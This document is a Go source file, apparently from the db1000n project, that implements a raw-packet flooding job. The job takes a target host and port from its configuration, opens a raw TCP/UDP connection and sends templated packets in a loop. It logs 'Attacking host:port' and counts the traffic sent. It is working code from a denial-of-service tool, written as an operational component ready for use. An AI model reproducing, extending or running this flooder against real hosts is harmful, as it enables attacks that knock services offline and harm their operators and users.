package jobs

import (
	"context"
	"log"
	"strconv"
	"time"

	"github.com/google/uuid"
	"github.com/mitchellh/mapstructure"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/packetgen"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func packetgenJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) error {
	defer utils.PanicHandler()

	type packetgenJobConfig struct {
		BasicJobConfig
		Packet  map[string]interface{}
		Network packetgen.NetworkConfig
		Host    string
		Port    string
	}

	var jobConfig packetgenJobConfig

	if err := mapstructure.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing json: %v", err)
		return err
	}

	host := templates.ParseAndExecute(jobConfig.Host, nil)
	port, err := strconv.Atoi(templates.ParseAndExecute(jobConfig.Port, nil))
	if err != nil {
		log.Printf("Error parsing port: %v", err)
		return err
	}

	if jobConfig.Network.Address == "" {
		jobConfig.Network.Address = "0.0.0.0"
	}

	if jobConfig.Network.Name == "" {
		jobConfig.Network.Name = "ip4:tcp"
	}

	packetTpl, err := templates.ParseMapStruct(jobConfig.Packet)
	if err != nil {
		log.Printf("Error parsing packet: %v", err)
		return err
	}
	log.Printf("Attacking %v:%v", host, port)

	protocolLabelValue := "tcp"
	if _, ok := jobConfig.Packet["udp"]; ok {
		protocolLabelValue = "udp"
	}
	hostPort := host + ":" + strconv.FormatInt(int64(port), 10)

	rawConn, err := packetgen.OpenRawConnection(jobConfig.Network)
	if err != nil {
		log.Printf("Error building raw connection: %v", err)
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)

	for jobConfig.Next(ctx) {
		packetConfigRaw := packetTpl.Execute(nil)
		if debug {
			log.Printf("[packetgen] Rendered packet config template:\n%s", packetConfigRaw)
		}

		var packetConfig packetgen.PacketConfig
		if err := mapstructure.WeakDecode(packetConfigRaw, &packetConfig); err != nil {
			log.Printf("Error parsing json: %v", err)
			return err
		}

		len, err := packetgen.SendPacket(packetConfig, rawConn, host, port)
		if err != nil {
			log.Printf("Error sending packet: %v", err)
			metrics.IncPacketgen(
				host,
				hostPort,
				protocolLabelValue,
				metrics.StatusFail)
			return err
		}
		metrics.IncPacketgen(
			host,
			hostPort,
			protocolLabelValue,
			metrics.StatusSuccess)

		trafficMonitor.Add(len)
	}

	return nil
}
